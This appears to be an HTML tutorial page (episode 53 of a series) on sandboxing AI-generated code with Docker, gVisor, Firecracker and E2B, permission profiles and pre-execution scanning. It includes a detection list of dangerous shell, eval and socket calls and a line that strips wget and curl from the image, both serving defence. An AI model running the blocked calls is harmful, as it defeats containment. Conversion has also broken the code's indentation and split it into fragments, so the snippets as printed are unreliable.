+<div class="code-block">
+  <div class="code-header">
+    <div class="code-dots"><div class="cd cd-r"></div><div class="cd cd-y"></div><div class="cd cd-g"></div></div>
+    <div class="code-filename">example</div>
+    <div class="code-lang">code</div>
+  </div>
+  <div class="code-body"><pre><code>rm -f /usr/bin/wget /usr/bin/curl</code></pre></div>
+</div>
+<h2 id="s20">Drop to non-root user</h2><div class="section-rule"></div>
+<h2 id="s21">USER sandbox</h2><div class="section-rule"></div>
+<h2 id="s22">WORKDIR /workspace</h2><div class="section-rule"></div>
+<h2 id="s23">No CMD — container is used for exec commands</h2><div class="section-rule"></div>
+<h2 id="s24">Running Code in a Sandbox</h2><div class="section-rule"></div>
+<p>python</p>
+<p>import docker</p>
+<p>import tempfile</p>
+<p>import os</p>
+<div class="code-block">
+  <div class="code-header">
+    <div class="code-dots"><div class="cd cd-r"></div><div class="cd cd-y"></div><div class="cd cd-g"></div></div>
+    <div class="code-filename">snippet</div>
+    <div class="code-lang">code</div>
+  </div>
+  <div class="code-body"><pre><code>client = docker.from_env()
+def execute_sandboxed(code: str, timeout: int = 30) -&gt; dict:
+"""Execute Python code in an isolated container"""
+# Write code to a temp file
+    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
+        f.write(code)
+        code_path = f.name
+try:
+        container = client.containers.run(
+            image="ai-sandbox:latest",
+            command=f"python /workspace/script.py",
+            volumes={
+                code_path: {"bind": "/workspace/script.py", "mode": "ro"}
+            },
+            # CRITICAL SECURITY SETTINGS
+            mem_limit="512m",           # Max 512MB RAM
+            cpu_period=100000,
+            cpu_quota=50000,            # 50% of one CPU core
+            network_disabled=True,       # NO network access
+            read_only=True,             # Read-only filesystem
+            tmpfs={"/tmp": "size=100m"}, # Small writable temp space
+            user="sandbox",             # Non-root user
+            security_opt=["no-new-privileges"],  # Can't escalate
+            detach=True,
+        )
+# Wait with timeout
+        result = container.wait(timeout=timeout)
+        logs = container.logs().decode("utf-8")
+return {
+            "exit_code": result["StatusCode"],
+            "stdout": logs,
+            "error": None if result["StatusCode"] == 0 else logs
+        }
+except docker.errors.ContainerError as e:
+        return {"exit_code": 1, "stdout": "", "error": str(e)}
+finally:
+        try:
+            container.remove(force=True)
+        except:
+            pass
+        os.unlink(code_path)</code></pre></div>
+</div>
+<h2 id="s25">Security Settings Explained</h2><div class="section-rule"></div>
+<h2 id="s26">Setting	What It Does	Why It Matters</h2><div class="section-rule"></div>
+<div class="table-wrap"><table><thead><tr><th>mem_limit="512m"</th><th>Caps memory at 512MB</th><th>Prevents OOM attacks</th></tr></thead><tbody><tr><td>cpu_quota=50000</td><td>Limits to 50% of one CPU</td><td>Prevents crypto mining</td></tr><tr><td>network_disabled=True</td><td>No network access at all</td><td>Prevents data exfiltration</td></tr><tr><td>read_only=True</td><td>Can't write to filesystem</td><td>Prevents malware installation</td></tr><tr><td>user="sandbox"</td><td>Runs as non-root</td><td>Can't escalate privileges</td></tr><tr><td>no-new-privileges</td><td>Can't gain extra permissions</td><td>Defense in depth</td></tr><tr><td>timeout=30</td><td>Kills after 30 seconds</td><td>Prevents infinite loops</td></tr></tbody></table></div>
+<p>📊</p>
+<h2 id="s27">gVisor and Firecracker: Beyond Docker</h2><div class="section-rule"></div>
+<p>Regular Docker containers share the host kernel. A kernel exploit in the container could compromise the host. For higher security:</p>
+<div class="code-block">
+  <div class="code-header">
+    <div class="code-dots"><div class="cd cd-r"></div><div class="cd cd-y"></div><div class="cd cd-g"></div></div>
+    <div class="code-filename">snippet</div>
+    <div class="code-lang">code</div>
+  </div>
+  <div class="code-body"><pre><code>gVisor (Google's Sandbox)</code></pre></div>
+</div>
+<p>gVisor is a user-space kernel — it intercepts system calls from the container and handles them in a sandboxed process:</p>
+<p>Docker container: App → System Call → Host Kernel (shared)</p>
+<p>gVisor container: App → System Call → gVisor Kernel → Host Kernel (filtered)</p>
+<p>bash</p>
+<h2 id="s28">Install gVisor runtime</h2><div class="section-rule"></div>
+<h2 id="s29">Then use with Docker:</h2><div class="section-rule"></div>
+<p>docker run --runtime=runsc --rm ai-sandbox:latest python script.py</p>
+<p>gVisor blocks dangerous system calls entirely. Even if the code tries to exploit a kernel vulnerability, it hits gVisor's user-space kernel first.</p>
+<div class="code-block">
+  <div class="code-header">
+    <div class="code-dots"><div class="cd cd-r"></div><div class="cd cd-y"></div><div class="cd cd-g"></div></div>
+    <div class="code-filename">snippet</div>
+    <div class="code-lang">code</div>
+  </div>
+  <div class="code-body"><pre><code>Firecracker (AWS's microVM)</code></pre></div>
+</div>
+<p>Firecracker creates lightweight micro-VMs — actual virtual machines that boot in 125ms:</p>
+<p>Docker: App → Container → Shared Kernel → Hardware</p>
+<p>Firecracker: App → microVM → Own Kernel → Hardware</p>
+<p>This is what AWS Lambda and Fly.io use. Each execution gets its own virtual machine with its own kernel. Complete isolation.</p>
+<h2 id="s30">Comparison</h2><div class="section-rule"></div>
+<h2 id="s31">Feature	Docker	Docker + gVisor	Firecracker</h2><div class="section-rule"></div>
+<h2 id="s32">Isolation	Process-level	Syscall-filtered	VM-level</h2><div class="section-rule"></div>
+<div class="table-wrap"><table><thead><tr><th>Startup time</th><th>~100ms</th><th>~200ms</th><th>~125ms</th></tr></thead><tbody><tr><td>Overhead</td><td>Minimal</td><td>~5-15%</td><td>~5-10%</td></tr><tr><td>Security</td><td>Good</td><td>Very good</td><td>Excellent</td></tr><tr><td>Kernel shared</td><td>Yes</td><td>Partially</td><td>No</td></tr><tr><td>Best for</td><td>Development, trusted code</td><td>Production sandboxing</td><td>Multi-tenant, untrusted code</td></tr></tbody></table></div>
+<h2 id="s33">E2B: Sandboxing as a Service</h2><div class="section-rule"></div>
+<p>Don't want to manage sandbox infrastructure? E2B (e2b.dev) provides cloud sandboxes via API:</p>
+<p>python</p>
+<p>from e2b_code_interpreter import Sandbox</p>
+<h2 id="s34">Create a sandbox (boots in ~150ms)</h2><div class="section-rule"></div>
+<div class="code-block">
+  <div class="code-header">
+    <div class="code-dots"><div class="cd cd-r"></div><div class="cd cd-y"></div><div class="cd cd-g"></div></div>
+    <div class="code-filename">snippet</div>
+    <div class="code-lang">code</div>
+  </div>
+  <div class="code-body"><pre><code>sandbox = Sandbox()</code></pre></div>
+</div>
+<h2 id="s35">Execute code safely</h2><div class="section-rule"></div>
+<div class="code-block">
+  <div class="code-header">
+    <div class="code-dots"><div class="cd cd-r"></div><div class="cd cd-y"></div><div class="cd cd-g"></div></div>
+    <div class="code-filename">snippet</div>
+    <div class="code-lang">code</div>
+  </div>
+  <div class="code-body"><pre><code>execution = sandbox.run_code("""</code></pre></div>
+</div>
+<p>import pandas as pd</p>
+<p>import numpy as np</p>
+<h2 id="s36">Generate sample data</h2><div class="section-rule"></div>
+<div class="code-block">
+  <div class="code-header">
+    <div class="code-dots"><div class="cd cd-r"></div><div class="cd cd-y"></div><div class="cd cd-g"></div></div>
+    <div class="code-filename">snippet</div>
+    <div class="code-lang">code</div>
+  </div>
+  <div class="code-body"><pre><code>data = pd.DataFrame({
+'sales': np.random.randint(100, 1000, 50),
+    'region': np.random.choice(['North', 'South', 'East', 'West'], 50)</code></pre></div>
+</div>
+<p>})</p>
+<div class="code-block">
+  <div class="code-header">
+    <div class="code-dots"><div class="cd cd-r"></div><div class="cd cd-y"></div><div class="cd cd-g"></div></div>
+    <div class="code-filename">snippet</div>
+    <div class="code-lang">code</div>
+  </div>
+  <div class="code-body"><pre><code>print(data.groupby('region')['sales'].mean())</code></pre></div>
+</div>
+<p>""")</p>
+<div class="code-block">
+  <div class="code-header">
+    <div class="code-dots"><div class="cd cd-r"></div><div class="cd cd-y"></div><div class="cd cd-g"></div></div>
+    <div class="code-filename">snippet</div>
+    <div class="code-lang">code</div>
+  </div>
+  <div class="code-body"><pre><code>print(execution.text)    # stdout
+print(execution.error)   # stderr, if any</code></pre></div>
+</div>
+<h2 id="s37">Upload files for the agent to work with</h2><div class="section-rule"></div>
+<p>sandbox.files.write("/workspace/data.csv", csv_content)</p>
+<h2 id="s38">Download results</h2><div class="section-rule"></div>
+<div class="code-block">
+  <div class="code-header">
+    <div class="code-dots"><div class="cd cd-r"></div><div class="cd cd-y"></div><div class="cd cd-g"></div></div>
+    <div class="code-filename">snippet</div>
+    <div class="code-lang">code</div>
+  </div>
+  <div class="code-body"><pre><code>result = sandbox.files.read("/workspace/output.png")</code></pre></div>
+</div>
+<h2 id="s39">Sandbox auto-destroys after timeout</h2><div class="section-rule"></div>
+<p>sandbox.close()</p>
+<h2 id="s40">E2B Features</h2><div class="section-rule"></div>
+<h2 id="s41">Feature	Details</h2><div class="section-rule"></div>
+<div class="table-wrap"><table><thead><tr><th>Boot time</th><th>~150ms</th></tr></thead><tbody><tr><td>Languages</td><td>Python, JavaScript, R, Bash, more</td></tr><tr><td>File upload/download</td><td>Yes — send data in, get results out</td></tr><tr><td>Network</td><td>Configurable — allow or block</td></tr><tr><td>Persistence</td><td>Optional — keep sandbox alive between calls</td></tr><tr><td>GPU support</td><td>Available for ML workloads</td></tr><tr><td>Pricing</td><td>Per-second billing, starts at $0.0001/sec</td></tr></tbody></table></div>
+<div class="callout callout-tip"><span class="callout-icon">💡</span><p></p></div>
+<p>Permission Models: What Can the Agent Do?</p>
+<p>Beyond container isolation, you need a permission system that defines what actions are allowed:</p>
+<h2 id="s42">The Principle of Least Privilege</h2><div class="section-rule"></div>
+<p>Give the agent the minimum permissions needed for its task:</p>
+<p>python</p>
+<p>class AgentPermissions:</p>
+<div class="code-block">
+  <div class="code-header">
+    <div class="code-dots"><div class="cd cd-r"></div><div class="cd cd-y"></div><div class="cd cd-g"></div></div>
+    <div class="code-filename">example</div>
+    <div class="code-lang">code</div>
+  </div>
+  <div class="code-body"><pre><code>def __init__(self, config):
+        self.allowed_modules = config.get("modules", [])
+        self.allowed_paths = config.get("paths", [])
+        self.network_allowed = config.get("network", False)
+        self.max_file_size = config.get("max_file_size", 10_000_000)  # 10MB
+        self.allowed_commands = config.get("commands", [])</code></pre></div>
+</div>
+<h2 id="s43">Permission profiles for different agent types</h2><div class="section-rule"></div>
+<h2 id="s44">PROFILES = {</h2><div class="section-rule"></div>
+<div class="code-block">
+  <div class="code-header">
+    <div class="code-dots"><div class="cd cd-r"></div><div class="cd cd-y"></div><div class="cd cd-g"></div></div>
+    <div class="code-filename">example</div>
+    <div class="code-lang">code</div>
+  </div>
+  <div class="code-body"><pre><code>"data_analyst": AgentPermissions({
+        "modules": ["pandas", "numpy", "matplotlib", "seaborn", "scipy"],
+        "paths": ["/workspace/data/*", "/workspace/output/*"],
+        "network": False,
+        "max_file_size": 100_000_000,  # 100MB for data files
+        "commands": [],  # No shell commands
+    }),</code></pre></div>
+</div>
+<div class="code-block">
+  <div class="code-header">
+    <div class="code-dots"><div class="cd cd-r"></div><div class="cd cd-y"></div><div class="cd cd-g"></div></div>
+    <div class="code-filename">example</div>
+    <div class="code-lang">code</div>
+  </div>
+  <div class="code-body"><pre><code>"web_researcher": AgentPermissions({
+        "modules": ["requests", "beautifulsoup4", "json"],
+        "paths": ["/workspace/cache/*"],
+        "network": True,  # Needs internet
+        "allowed_domains": ["*.wikipedia.org", "*.arxiv.org"],
+        "commands": [],
+    }),</code></pre></div>
+</div>
+<div class="code-block">
+  <div class="code-header">
+    <div class="code-dots"><div class="cd cd-r"></div><div class="cd cd-y"></div><div class="cd cd-g"></div></div>
+    <div class="code-filename">example</div>
+    <div class="code-lang">code</div>
+  </div>
+  <div class="code-body"><pre><code>"code_assistant": AgentPermissions({
+        "modules": ["*"],  # Any Python module
+        "paths": ["/workspace/project/*"],
+        "network": False,
+        "commands": ["pytest", "ruff", "mypy"],  # Only linting/testing
+    }),</code></pre></div>
+</div>
+<p>}</p>
+<h2 id="s45">Static Code Analysis Before Execution</h2><div class="section-rule"></div>
+<p>Before running code, scan it for dangerous patterns:</p>
+<p>python</p>
+<p>import ast</p>
+<h2 id="s46">DANGEROUS_CALLS = {</h2><div class="section-rule"></div>
+<div class="code-block">
+  <div class="code-header">
+    <div class="code-dots"><div class="cd cd-r"></div><div class="cd cd-y"></div><div class="cd cd-g"></div></div>
+    <div class="code-filename">example</div>
+    <div class="code-lang">code</div>
+  </div>
+  <div class="code-body"><pre><code>"os.system", "os.popen", "os.exec", "os.execvp",
+    "subprocess.run", "subprocess.Popen", "subprocess.call",
+    "shutil.rmtree", "shutil.move",
+    "eval", "exec", "compile",
+    "__import__",
+    "open",  # Flag but don't always block</code></pre></div>
+</div>
+<p>}</p>
+<div class="code-block">
+  <div class="code-header">
+    <div class="code-dots"><div class="cd cd-r"></div><div class="cd cd-y"></div><div class="cd cd-g"></div></div>
+    <div class="code-filename">snippet</div>
+    <div class="code-lang">code</div>
+  </div>
+  <div class="code-body"><pre><code>def analyze_code_safety(code: str) -&gt; list:
+"""Static analysis to detect dangerous code patterns"""
+    warnings = []
+try:
+        tree = ast.parse(code)
+    except SyntaxError as e:
+        return [f"Syntax error: {e}"]
+for node in ast.walk(tree):
+        # Check function calls
+        if isinstance(node, ast.Call):
+            func_name = get_func_name(node)
+            if func_name in DANGEROUS_CALLS:
+                warnings.append(
+                    f"Line {node.lineno}: Dangerous call '{func_name}'"
+                )
+# Check imports
+        if isinstance(node, ast.Import):
+            for alias in node.names:
+                if alias.name in ["os", "subprocess", "shutil", "socket"]:
+                    warnings.append(
+                        f"Line {node.lineno}: Suspicious import '{alias.name}'"
+                    )
+return warnings</code></pre></div>
+</div>
+<h2 id="s47">Pre-check before execution</h2><div class="section-rule"></div>
+<div class="code-block">
+  <div class="code-header">
+    <div class="code-dots"><div class="cd cd-r"></div><div class="cd cd-y"></div><div class="cd cd-g"></div></div>
+    <div class="code-filename">snippet</div>
+    <div class="code-lang">code</div>
+  </div>
+  <div class="code-body"><pre><code>code = agent_generated_code
+warnings = analyze_code_safety(code)</code></pre></div>
+</div>
+<p>if warnings:</p>
+<div class="code-block">
+  <div class="code-header">
+    <div class="code-dots"><div class="cd cd-r"></div><div class="cd cd-y"></div><div class="cd cd-g"></div></div>
+    <div class="code-filename">example</div>
+    <div class="code-lang">code</div>
+  </div>
+  <div class="code-body"><pre><code># Ask for human approval or reject
+    print(f"Code flagged: {warnings}")</code></pre></div>
+</div>
+<p>else:</p>
+<div class="code-block">
+  <div class="code-header">
+    <div class="code-dots"><div class="cd cd-r"></div><div class="cd cd-y"></div><div class="cd cd-g"></div></div>
+    <div class="code-filename">example</div>
+    <div class="code-lang">code</div>
+  </div>
+  <div class="code-body"><pre><code># Safe to execute in sandbox
+    execute_sandboxed(code)</code></pre></div>
+</div>
+<p>🔬</p>
+<h2 id="s48">Real-World Sandbox Architectures</h2><div class="section-rule"></div>
+<h2 id="s49">OpenAI Code Interpreter</h2><div class="section-rule"></div>
+<p>OpenAI's code interpreter uses a sandboxed Jupyter kernel:</p>
+<p>User → ChatGPT → Code Generation → Sandbox (Jupyter) → Result → User</p>
+<div class="code-block">
+  <div class="code-header">
+    <div class="code-dots"><div class="cd cd-r"></div><div class="cd cd-y"></div><div class="cd cd-g"></div></div>
+    <div class="code-filename">example</div>
+    <div class="code-lang">code</div>
+  </div>
+  <div class="code-body"><pre><code>│
+                                        ├── Isolated container per session
+                                        ├── No internet access
+                                        ├── Pre-installed packages
+                                        ├── File upload/download only
+                                        └── Auto-destroyed after session</code></pre></div>
+</div>
+<h2 id="s50">Anthropic's Computer Use</h2><div class="section-rule"></div>
+<p>Claude's computer use feature runs in a sandboxed VM:</p>
+<p>User → Claude → Action Plan → Sandbox VM → Screenshot → Claude → ...</p>
+<div class="code-block">
+  <div class="code-header">
+    <div class="code-dots"><div class="cd cd-r"></div><div class="cd cd-y"></div><div class="cd cd-g"></div></div>
+    <div class="code-filename">example</div>
+    <div class="code-lang">code</div>
+  </div>
+  <div class="code-body"><pre><code>│
+                                   ├── Full desktop environment
+                                   ├── Isolated from host
+                                   ├── Network access (controlled)
+                                   ├── Mouse/keyboard simulation
+                                   └── Human can observe in real-time</code></pre></div>
+</div>
+<h2 id="s51">Open-Source Agent Frameworks</h2><div class="section-rule"></div>
+<p>Most frameworks (LangChain, CrewAI, AutoGen) support pluggable execution backends:</p>
+<p>python</p>
+<h2 id="s52">LangChain with sandboxed execution</h2><div class="section-rule"></div>
+<p>from langchain_experimental.tools import PythonREPLTool</p>
+<p>from langchain.tools import Tool</p>
+<h2 id="s53">Instead of local execution:</h2><div class="section-rule"></div>
+<h2 id="s54">tool = PythonREPLTool()  # ⚠️ DANGEROUS — runs on your machine</h2><div class="section-rule"></div>
+<h2 id="s55">Use sandboxed execution:</h2><div class="section-rule"></div>
+<div class="code-block">
+  <div class="code-header">
+    <div class="code-dots"><div class="cd cd-r"></div><div class="cd cd-y"></div><div class="cd cd-g"></div></div>
+    <div class="code-filename">snippet</div>
+    <div class="code-lang">code</div>
+  </div>
+  <div class="code-body"><pre><code>def sandboxed_python(code: str) -&gt; str:
+result = execute_sandboxed(code, timeout=30)
+    return result["stdout"] if not result["error"] else result["error"]
+tool = Tool(
+name="python_sandbox",
+    func=sandboxed_python,
+    description="Execute Python code in an isolated sandbox"</code></pre></div>
+</div>
+<p>)</p>
+<p>🛡️</p>
+<h2 id="s56">The Sandbox Checklist</h2><div class="section-rule"></div>
+<h2 id="s57">Before deploying an AI agent with code execution:</h2><div class="section-rule"></div>
+<p>□ Container isolation (Docker minimum)</p>
+<p>□ Non-root user</p>
+<p>□ Memory limits</p>
+<p>□ CPU limits</p>
+<p>□ Execution timeout</p>
+<p>□ Network disabled (or allowlisted domains only)</p>
+<p>□ Read-only filesystem (except /tmp or /workspace)</p>
+<p>□ No access to host filesystem</p>
+<p>□ No access to host Docker socket</p>
+<p>□ Static code analysis before execution</p>
+<p>□ Logging of all executed code</p>
+<p>□ Human-in-the-loop for destructive operations</p>
+<p>□ Auto-destroy containers after use</p>
+<p>📦</p>
+<h2 id="s58">Practical Takeaways</h2><div class="section-rule"></div>
+<p>Never run LLM-generated code on your host machine — always use a sandbox</p>
+<p>Docker is the minimum — add gVisor or Firecracker for untrusted multi-tenant scenarios</p>
+<p>E2B is the fastest path — cloud sandbox API, no infrastructure to manage</p>
+<p>Disable network by default — if the agent doesn't need internet, don't give it internet</p>
+<p>Static analysis + container isolation = defense in depth — catch dangerous patterns before execution, contain damage if they slip through</p>
+<p>Log everything — every piece of code the agent generates and executes should be auditable</p>
+<p>🚀</p>
+<p>What's Next?</p>
+<p>Episode 54: Data Privacy — Sandboxing protects your infrastructure. But what about your users' data? When you send a prompt to OpenAI, where does that data go? Who can see it? Is it used for training? We'll cover PII detection, data residency, GDPR compliance, and how to build AI apps that respect privacy.</p>
+<p>← Previous</p>
+<h2 id="s59">Ep 52: Guardrails</h2><div class="section-rule"></div>
+<p>Next →</p>
+<h2 id="s60">Ep 54: Data Privacy in AI Systems</h2><div class="section-rule"></div>
+<p>Next: Episode 54 — Data Privacy in AI Systems</p>
+<p>Every word you type into ChatGPT, every document you upload to Claude — it all goes somewhere. Here's exactly where.</p>
+<p>This is part of a 98-episode series covering AI engineering from tokens to production deployment.</p>
+  </article>
+  <div class="ep-nav">
+    <a href="episode-52.html" class="ep-nav-card">
+      <span class="ep-nav-dir">← Previous</span>
+      <span class="ep-nav-title">Ep 52: Guardrails: Keeping AI on the Rails</span>
+    </a>
+    <a href="episode-54.html" class="ep-nav-card next">
+      <span class="ep-nav-dir">Next Episode →</span>
+      <span class="ep-nav-title">Ep 54: Data Privacy in AI Systems: What Gets Sent Where</span>
+    </a>
+  </div>
+</main>
+
+<footer>
+  <div class="footer-inner">
+    <div>
+      <img class="footer-logo" src="https://storagev2.files-vault.com/uploads/blacklabel-380/sub-account-79289/1775541373-bchJFljNp0.webp" alt="Brand Docks" />
+      <div class="footer-tagline">98 Field Manual · Build with AI, not just use it · Free forever</div>
+    </div>
+    <div class="footer-links">
+      <a href="field-manual-index.html">All Episodes</a>
+      <a href="field-manual-index.html#g8">Security & Production</a>
+      <a href="episode-52.html">← Ep 52</a>
+      <a href="episode-54.html">Ep 54 →</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+const prog=document.getElementById('prog');
+window.addEventListener('scroll',()=>{
+  const total=document.documentElement.scrollHeight-window.innerHeight;
+  prog.style.width=Math.min(100,(window.scrollY/total)*100)+'%';
+},{passive:true});
+
+// Build section nav dots from h2s
+const h2s=document.querySelectorAll('.prose h2');
+const sNav=document.getElementById('sectionNav');
+const dots=[];
+h2s.forEach((h,i)=>{
+  const btn=document.createElement('button');
+  btn.className='snav-dot';
+  btn.setAttribute('data-label',h.textContent.trim().substring(0,28));
+  btn.onclick=()=>h.scrollIntoView({behavior:'smooth',block:'start'});
+  sNav.appendChild(btn);
+  dots.push({btn,h});
+});
+
+const dotObs=new IntersectionObserver((entries)=>{
+  entries.forEach(e=>{
+    if(e.isIntersecting){
+      const idx=dots.findIndex(d=>d.h===e.target);
+      if(idx>-1) dots.forEach((d,i)=>d.btn.classList.toggle('active',i===idx));
+    }
+  });
+},{rootMargin:'-30% 0px -60% 0px'});
+dots.forEach(d=>dotObs.observe(d.h));
+
+// Scroll reveal
+const revObs=new IntersectionObserver((entries)=>{
+  entries.forEach(e=>{if(e.isIntersecting){e.target.style.opacity='1';e.target.style.transform='translateY(0)';}});
+},{threshold:0.08});
+document.querySelectorAll('.toc,.callout,.table-wrap,.code-block,.ep-nav-card').forEach(el=>{
+  el.style.opacity='0';
+  el.style.transform='translateY(14px)';
+  el.style.transition='opacity 0.55s ease,transform 0.55s ease';
+  revObs.observe(el);
+});
+</script>
+</body>
+</html>
